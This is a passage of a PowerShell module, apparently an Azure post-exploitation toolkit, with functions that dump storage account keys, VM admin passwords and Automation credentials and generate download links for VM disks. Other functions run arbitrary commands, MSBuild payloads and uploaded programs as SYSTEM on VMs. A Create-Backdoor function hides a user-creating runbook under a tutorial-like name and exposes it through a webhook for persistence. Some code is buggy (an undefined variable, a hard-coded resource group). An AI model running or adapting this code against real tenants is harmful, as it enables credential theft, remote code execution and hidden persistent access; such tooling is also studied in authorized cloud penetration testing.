            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup" -ForegroundColor Red

     }
     elseif($StorageAccount -eq "")
     {
            Write-Host "Requires Storage Account name" -ForegroundColor Red
            Write-Host "Usage example: Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete" -ForegroundColor Red
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt" -ForegroundColor 
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup" -ForegroundColor Red
     }
     else
     {
     
         $keys = az storage account keys list -g $ResourceGroup -n $StorageAccount --query '[].{key:value}' -o tsv
         $split = $keys.Split([Environment]::NewLine)
         $key = $split[0]
         $Context = New-AzStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $key
         $Things = Get-AzStorageShare -Context $Context
         $Shares = $Things.Name

         Foreach($Share in $Shares)
         {
 
           if($File)
           {
             $Splitted = $File.Split("/")
             $Filename = $Splitted[-1]
             cat $Filename
             if($NoDelete -eq $true)
             {
                Get-AzStorageFileContent -Path $File -ShareName $Share -Context $Context
                cat $Filename
             }
             else
             {
                Get-AzStorageFileContent -Path $File -ShareName $Share -Context $Context
                cat $Filename
                rm $Filename
             }  
           }
           else
           {
                Write-Host "Enumerating $Share"   
                Write-Host "------------------"  
                Get-AzStorageFile -ShareName $Share -Context $Context
           }
         }
     }
}

function Upload-StorageContent
{
<#
.SYNOPSIS 
    Uploads a supplied file to a storage share.
.PARAMETER
    
    -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
    -Share (Share name to upload to)
.EXAMPLE
    
    Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt
    
    
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$File = $null,
     [Parameter(Mandatory=$false)][String]$Share = $null,
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$StorageAccount = $null)
     If($StorageAccount -eq "")
     {
            Write-Host "Requires Storage account name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     elseif($Share -eq "")
     {
            Write-Host "Requires Share name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     elseif($File -eq "")
     {
            Write-Host "Requires File name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     elseif($ResourceGroup -eq "")
     {
            Write-Host "Requires Resource Group name" -ForegroundColor Red
            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
     }
     else
     {
         $keys = az storage account keys list -g $ResourceGroup -n $StorageAccount --query '[].{key:value}' -o tsv
         $split = $keys.Split([Environment]::NewLine)
         $key = $split[0]
         az storage file upload -s $Share --source $File --account-name $StorageAccount --account-key $key
     }
}

function Get-StorageAccountKeys
{
<#
.SYNOPSIS 
    Gets the account keys for a storage account
.PARAMETER
    -group
    -account 
    -kerb (optional, use if kerberos keys are suspected)
.EXAMPLE
    Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb
    
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$Account = $null,
     [Parameter(Mandatory=$false)][Switch]$kerb = $null)
     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb " -ForegroundColor Red

     }
     elseif($Account -eq "")
     {
        Write-Host "Requires Storage account name" -ForegroundColor Red
        Write-Host "Usage: Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb " -ForegroundColor Red
     }
     else
     {
            if($kerb)
             {
             az storage account keys list -g $ResourceGroup -n $Account --expand-key-type kerb | ConvertFrom-Json
             }
             else
             {
             az storage account keys list -g $ResourceGroup -n $Account | ConvertFrom-Json
             }
     }
}

function Get-AvailableVMDisks
{
<#
.SYNOPSIS 
    Lists the VM disks available.      
#>

 az disk list --query '[].{Name:name,Size:diskSizeGb,Encryption:encryption,OS:osType,Creation:timeCreated,Id:uniqueId}' -o table

}

function Get-VMDisk
{
<#
.SYNOPSIS 
    Generates a link to download a Virtual Machiche's disk. The link is only available for an hour.
.PARAMETER
    
    -ResourceGroup 
    -DiskName

.EXAMPLE
    
    Get-VMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup TestGroup
        
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$DiskName = $null,
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
    if($DiskName -eq "")
     {
        Write-Host "Requires Disk name" -ForegroundColor Red
        Write-Host "Usage: Get-VMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup TestGroup" -ForegroundColor Red

     }
     elseif($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Get-VMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup TestGroup" -ForegroundColor Red
     }
     else
     {
        Write-Host "Download Link: "
        Write-Host ""
        az disk grant-access --name $DiskName --duration-in-seconds 3600 --resource-group $ResourceGroup --query [accessSas] -o tsv
     }
}

function Get-VMs
{
    az vm list --query '[].{Name:name,AdminUserName:osProfile.adminUsername,AdminPassword:osProfile.adminPassword,Id:vmId,Secrets:secrets}' -o table
    Write-Host ""
    az vm list-ip-addresses -o table
    Write-Host ""
}

function Stop-VM
{
<#
.SYNOPSIS
    Stops a VM
.PARAMETER
    -VM (Name of machine)
    -ResourceGrou (Resource group it's located in)
.EXAMPLE
    Stop-VM -VM Example2016R2 -ResourceGroup Test_RG
#>
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Stop-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red

     }
     elseif($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Stop-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red

     }
        az vm stop -n $VM -g $ResourceGroup
}

function Start-VM
{
<#
.SYNOPSIS
    Starts a VM
.PARAMETER
    -VM (Name of machine)
    -ResourceGroup (Resource group it's located in)
.EXAMPLE
    Start-VM -VM Example2016R2 -ResourceGroup Test_RG
#>
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Start-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red

     }
     elseif($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Start-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red
     }
     else
     {
        az vm start -n $VM -g $ResourceGroup
     }
}

function Restart-VM
{
<#
.SYNOPSIS
    Starts a VM
.PARAMETER
    -VM (Name of machine)
    -ResourceGroup (Resource group it's located in)
.EXAMPLE
    Restart-VM -VM Example2016R2 -ResourceGroup Test_RG
#>
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Restart-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red

     }
     elseif($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Restart-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red
     }
     else
     {

        az vm restart -n $VM -g $ResourceGroup
     }
}

function Get-AutomationCredentials 
{
 <#
.SYNOPSIS
    Gets the credentials from any Automation Accounts
.PARAMETER
    -AutomationAccount (Name of Automation account)
    -ResourceGroup (Resource group it's located in)
.EXAMPLE
    Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
     }
     elseif($AutomationAccount -eq "")
     {
        Write-Host "Requires Automation Account name" -ForegroundColor Red
        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
     }
     else
     {
        Get-AzAutomationCredential -AutomationAccountName $AutomationAccount -ResourceGroupName $ResourceGroup
     }

}

function Get-Runbooks
{
 <#
.SYNOPSIS
    Lists all the run books
#>
    $accounts = Get-AzAutomationAccount

    ForEach ($account in $accounts)
    {
        $name = $account.AutomationAccountName
        $RG = $account.ResourceGroupName
        $Books = Get-AzAutomationRunbook -AutomationAccountName $name -ResourceGroupName $RG
        ForEach ($Book in $Books)
        {
        $BookName = $Book.Name
        $State = $Book.State
        $Creation = $Book.CreationTime
        $Modified = $Book.LastModifiedTime
        $Acc = $account.AutomationAccountName
        Write-Host "Runbook name: $BookName"
        Write-Host "Slot: $State"
        Write-Host "Created on: $Creation"
        Write-Host "Last modified: $Modified"
        Write-Host "Automation Account: $Acc"
        Write-Host "Resource Group: $RG"
        Write-Host ""

        }
 
    }

}

function Get-Runbook
{
 <#
.SYNOPSIS
    Gets a specific Runbook and displays its contents. Use -NoDelete to not delete after reading
.PARAMETER
    -Runbook (Name of Runbook)
    -Group (Resource group it's located in)
    -Account (Automation Account Name)
    -NoDelete (Do not delete after displaying contents)

    All this info can be gathered using Get-Runbooks

    -Slot (Optional; use if differenciating between published or drafted Runbook)
.EXAMPLE
    Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook
    Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Published"
    Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Draft"
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Account = $null,
        [Parameter(Mandatory=$false)][String]$Runbook = $null,
        [Parameter(Mandatory=$false)][switch]$NoDelete = $null,
        [Parameter(Mandatory=$false)][String]$Slot = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook" -ForegroundColor Red
        Write-Host "       Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Published"" -ForegroundColor Red
        Write-Host "       Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Draft"" -ForegroundColor Red
     }
     elseif($Account -eq "")
     {
        Write-Host "Requires Account name" -ForegroundColor Red
        Write-Host "Usage: Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook" -ForegroundColor Red
        Write-Host "       Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Published"" -ForegroundColor Red
        Write-Host "       Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Draft"" -ForegroundColor Red
     }
     elseif($Runbook -eq "")
     {
        Write-Host "Requires Runbook name" -ForegroundColor Red
        Write-Host "Usage: Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook" -ForegroundColor Red
        Write-Host "       Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Published"" -ForegroundColor Red
        Write-Host "       Get-Runbook -Account AutomationAccountexample -ResourceGroup TestGroup -Runbook TestBook -Slot "Draft"" -ForegroundColor Red
     }


                if($Slot)
                {
                    Export-AzAutomationRunbook -ResourceGroupName $ResourceGroup -AutomationAccountName $Account -Name $Runbook -Slot $slot -OutputFolder .  | Out-Null
            
                    if($NoDelete -eq $true)
                    {
                        cat ".\$Runbook.ps1"
                        cat ".\$Runbook.py"
               
                    }
                    else
                    {
                        cat ".\$Runbook.ps1"
                        cat ".\$Runbook.py"
                        rm ".\$Runbook.ps1"
                        rm ".\$Runbook.py"
                    }
                }
                else
                {
                    Export-AzAutomationRunbook -ResourceGroupName $ResourceGroup -AutomationAccountName $Account -Name $Runbook -OutputFolder . | Out-Null
                    if($NoDelete -eq $true)
                    {
                        cat ".\$Runbook.ps1"
                        cat ".\$Runbook.py"
               
                    }
                    else
                    {
                        cat ".\$Runbook.ps1"
                        cat ".\$Runbook.py"
                        rm ".\$Runbook.ps1"
                        rm ".\$Runbook.py"
                    }
                }

}

function Start-Runbook
{
<#
.SYNOPSIS
    Starts a Runbook
.PARAMETER
    -Account (Name of Automation Account the Runbook is in)
    -ResourceGroup (Resource group it's located in)
    -Runbook (Name of runbook)
.EXAMPLE
    Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Account = $null,
        [Parameter(Mandatory=$false)][String]$Runbook = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook" -ForegroundColor Red
     }
     elseif($Account -eq "")
     {
        Write-Host "Requires Automation Account name" -ForegroundColor Red
        Write-Host "Usage: Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook" -ForegroundColor Red
     }
     elseif($Runbook -eq "")
     {
        Write-Host "Requires Runbook name" -ForegroundColor Red
        Write-Host "Usage: Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook" -ForegroundColor Red
     }
     else
     {    
         Start-AzAutomationRunbook -ResourceGroupName $ResourceGroup -AutomationAccountName $Account -Name $Runbook
     }
}

function Execute-Command
{
 <#
.SYNOPSIS
    Will run a command on a specified VM

.PARAMETER
    -OS (Windows/Linux)
    -ResourceGroup (Resource group it's located in)
    -Command 
    -VM (Name of VM to run file on. Obviously must be Windows with .net installed)

.EXAMPLE
    Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$OS = $null,
        [Parameter(Mandatory=$false)][String]$Command = $null,
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami" -ForegroundColor Red
     }
     elseif($OS -eq "")
     {
        Write-Host "Requires Operating System (Linux or Windows)" -ForegroundColor Red
        Write-Host "Usage: Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami" -ForegroundColor Red
     }
     elseif($Command -eq "")
     {
        Write-Host "Requires a command" -ForegroundColor Red
        Write-Host "Usage: Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami" -ForegroundColor Red
     }
     elseif($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami" -ForegroundColor Red
     }
     else
     {    
            if($OS -eq "Linux")
            {
                az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunShellScripts --scripts "$Command"
            }
            elseif($OS -eq "Windows")
            {
                az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "$Command"
            }
            else
            {
            Write-Host "OS Must be Windows or Linux"
            }
    }
}

function Execute-MSBuild
{
 <#
.SYNOPSIS
    Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.

.PARAMETER
    -ResourceGroup (Resource group it's located in)
    -File (MSBuild file or path to it. If in current directory do NOT use .\ )
    -VM (Name of VM to run file on. Obviously must be Windows with .NET installed)

.EXAMPLE
    Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File /path/to/payload/onyourmachine.xml
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$File = $null,
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File /path/to/payload/onyourmachine.xml" -ForegroundColor Red
     }
     elseif($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File /path/to/payload/onyourmachine.xml" -ForegroundColor Red
     }
     elseif($File -eq "")
     {
        Write-Host "Requires a file. Do not use .\ for same-directory files." -ForegroundColor Red
        Write-Host "Usage: Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File /path/to/payload/onyourmachine.xml" -ForegroundColor Red
     }
     else
     {
                $result = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts @$File
                $regex = $result -match '\d\d+(?=\.\w+)'
                $split = $regex.Split("\\,:")
                $name = $split[2]
                $path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name"
                $result = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "Start-Process $path" | Out-Null
                if($result -match "Provisioning succeeded")
                {
                    Write-Host "MSBuild launched successfully, hopefully the payload is good!"
                }
                else
                {
                    $resut
                }  
      }    

}

function Execute-Program
{
 <#
.SYNOPSIS
    Will run a supplied program of any extension on a specified VM. Requires Contributor Role. Will run as SYSTEM.

.PARAMETER
    -ResourceGroup (Resource group it's located in)
    -File (File/program name or path to it. If in current directory do NOT use .\ )
    -VM (Name of VM to run file on. Obviously must be Windows with .NET installed)

.EXAMPLE
    Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$File = $null,
        [Parameter(Mandatory=$false)][String]$VM = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe" -ForegroundColor Red
     }
     elseif($VM -eq "")
     {
        Write-Host "Requires VM name" -ForegroundColor Red
        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe" -ForegroundColor Red
     }
     elseif($File -eq "")
     {
        Write-Host "Requires a file. Do not use .\ for same-directory files." -ForegroundColor Red
        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe" -ForegroundColor Red
     }
     else
     {
    
            $StorageAccounts = az storage account list --query '[].{Name:name}' -o tsv
            $StorageAccount = $StorageAccounts[0]
            $Keys = az storage account keys list -g Test_RG -n $StorageAccount --query '[].{v:value}' -o tsv
            $Key = $Keys[0]
            $Containers = az storage container list --account-name $StorageAccount --account-key $Key --query '[].{n:name}' -o tsv
            $Container = $Containers[0]
            $Location = az vm list --query "[?name=='$VM'].{l:location}" -o tsv
            $ErrorActionPreference = "silentlyContinue"
            Write-Host "Uploading file.Ignore the warning that follows."
            Write-Host ""
            az storage blob upload --container-name $Container -f $File --account-name $StorageAccount -n $File | Out-Null
            Set-AzVMCustomScriptExtension -VMName $VM -ResourceGroupName $ResourceGroup -FileName $File -Name ScriptTest -StorageAccountName $StorageAccount -ContainerName $Container -Location $Location | Out-Null
            $results = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "ls C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\Downloads" -o yaml
            $splitted = $results.Split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)
            $nums = $splitted -match '(\d+)(?!.)'
            $num = $nums[-1]
            $path = "C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\Downloads\$num\$File"
            az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\Downloads\$num\$File"
        }
}

function Create-Backdoor
{
 <#
.SYNOPSIS
    Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
    This requires an account that is part of the 'Administrators' Role (Needed to make a user)

.PARAMETER
    -Username (Username you used to login to Azure with, that has permissions to create a Runbook and user)
    -Password (Password to that account)
    -Account (Azure Automation Account name)
    -ResourceGroup (Resource Group)
    -NewUsername (Username you want to create)
    -NewPassword (Password for that new account)

.EXAMPLE
    Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Account = $null,
        [Parameter(Mandatory=$false)][String]$Username = $null,
        [Parameter(Mandatory=$false)][String]$Password = $null,
        [Parameter(Mandatory=$false)][String]$NewUsername = $null,
        [Parameter(Mandatory=$false)][String]$NewPassword = $null,
        [Parameter(Mandatory=$false)][String]$File = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($Account -eq "")
     {
        Write-Host "Requires an Automation Account name" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($Username -eq "")
     {
        Write-Host "Requires an Administrative username" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($Password -eq "")
     {
        Write-Host "Requires an Administrative password" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($NewUsername -eq "")
     {
        Write-Host "Requires a new username" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($NewPassword -eq "")
     {
        Write-Host "Requires a new password." -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     else
     {
            $date = (Get-Date).AddDays(7)
            $formatted = $date.ToString("MM/dd/yyyy")
            if($File)
            {
                Import-AzAutomationRunbook -Path .\$File -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
            }
            else
            {
                $SplitName=$NewUsername -split "@"
                $DisplayName = $SplitName[0]
            
            
                $data = "az login -u $Username -p $Password" | Out-File AzureAutomationTutorialPowerShell.ps1
                $data2 = "az ad user create --display-name $DisplayName --password $NewPassword --user-principal-name $NewUsername" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
                $data4 = "az role assignment create --assignee $NewUPN --role Contributor" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
                Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
                Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Name AzureAutomationTutorialPowerShell
                Write-Host ""
                Write-Host "--------------------"
                Write-Host "COPY THIS URI, IT IS NOT RETRIEVABLE. PASS IT INTO Execute-BackDoor TO RUN IT"
                New-AzAutomationWebhook -Name "AzureAutomationTutorialPowerShell" -ResourceGroup $ResourceGroup -AutomationAccountName $Account -RunbookName "AzureAutomationTutorialPowerShell" -Force -IsEnabled $True -ExpiryTime $formatted
                rm AzureAutomationTutorialPowerShell.ps1
            }
        }
}

function Execute-Backdoor
{
 <#
.SYNOPSIS
    This runs the backdoor that is created with "Create-Backdoor

.PARAMETER
    -URI (Obtained from output of Create-Backdoor)

.EXAMPLE
    Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvpQ%3d
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$URI = $null)
     if($URI -eq "")
     {
        Write-Host "Requires URI" -ForegroundColor Red
        Write-Host "Usage: Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvpQ%3d" -ForegroundColor Red
     }
     else
     {
        $response = Invoke-WebRequest -Method Post -Uri $URI
        $jobid = (ConvertFrom-Json ($response.Content)).jobids[0]
     }
}
